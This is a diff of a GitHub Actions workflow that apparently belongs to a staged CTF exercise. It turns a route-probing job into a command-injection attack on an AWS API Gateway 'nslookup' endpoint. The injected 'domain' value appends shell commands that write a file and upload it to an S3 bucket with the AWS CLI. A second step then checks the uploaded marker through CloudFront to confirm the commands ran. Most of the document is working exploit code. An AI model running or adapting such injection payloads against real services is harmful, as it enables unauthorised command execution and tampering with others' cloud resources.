@@ -1,4 +1,4 @@
-name: Stage2-09-Probe-Nslookup-API
+name: Stage2-10-Command-Injection-Probe
 
 on:
   push:
@@ -14,8 +14,10 @@ jobs:
     runs-on: ubuntu-latest
 
     env:
-      API_ID: 3q931syi7b
       AWS_REGION: us-east-1
+      API_ID: 3q931syi7b
+      SITE_BUCKET: site781fe43f26b9eba3
+      SITE_DOMAIN: d4ysu55xg7wfi.cloudfront.net
 
     steps:
       - name: Configure AWS credentials
@@ -28,17 +30,17 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Probe vulnerable API routes
+      - name: Execute controlled shell-injection probe
         run: |
           python3 - <<'PY'
           import os
           import requests
           from requests_aws4auth import AWS4Auth
 
-          base = (
+          api = (
               "https://"
               + os.environ["API_ID"]
-              + ".execute-api.us-east-1.amazonaws.com"
+              + ".execute-api.us-east-1.amazonaws.com/dev/nslookup"
           )
 
           auth = AWS4Auth(
@@ -46,34 +48,40 @@ jobs:
               os.environ["AWS_SECRET_ACCESS_KEY"],
               "us-east-1",
               "execute-api",
-              session_token=os.environ.get("AWS_SESSION_TOKEN")
+              session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          paths = [
-              "/",
-              "/dev",
-              "/dev/",
-              "/dev/nslookup",
-              "/dev/lookup",
-              "/dev/resolve",
-              "/nslookup",
-              "/lookup",
-              "/resolve",
-              "/dev/code_exec"
-          ]
+          domain = (
+              "example.com; "
+              "printf CTF_PROBE > /tmp/ctf_probe; "
+              "/opt/aws s3api put-object "
+              "--bucket site781fe43f26b9eba3 "
+              "--key ctf-probe.txt "
+              "--body /tmp/ctf_probe "
+              "--region us-east-1 "
+              "--endpoint-url https://s3.us-east-1.amazonaws.com"
+          )
 
-          for path in paths:
-              url = base + path
+          response = requests.post(
+              api,
+              json={"domain": domain},
+              auth=auth,
+              timeout=40
+          )
 
-              response = requests.post(
-                  url,
-                  json={"domain": "example.com"},
-                  auth=auth,
-                  timeout=20
-              )
-
-              print(f"PATH={path}")
-              print(f"HTTP={response.status_code}")
-              print(response.text[:500])
-              print("---")
+          print(f"HTTP={response.status_code}")
+          print(response.text)
           PY
+
+      - name: Check marker through CloudFront
+        run: |
+          curl --silent --show-error \
+            --location \
+            --max-time 20 \
+            --output /tmp/marker \
+            --write-out "HTTP=%{http_code} SIZE=%{size_download}\n" \
+            "https://${SITE_DOMAIN}/ctf-probe.txt"
+
+          echo "Marker contents:"
+          head -c 200 /tmp/marker || true
+          echo
